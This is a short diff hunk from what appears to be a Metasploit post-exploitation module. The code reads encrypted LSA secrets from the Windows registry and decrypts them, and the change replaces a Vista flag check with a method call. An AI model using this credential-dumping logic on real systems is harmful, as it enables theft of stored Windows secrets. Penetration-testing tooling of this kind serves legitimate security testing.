@@ -54,7 +54,7 @@ class Metasploit3 < Msf::Post
         val_key = root_regkey + "\\" + secret_regkey + "\\" + mkeys
         encrypted_secret = registry_getvaldata(val_key, "")
 
-        if @vista == 1
+        if lsa_vista_style?
           # Magic happens here
           decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
         else
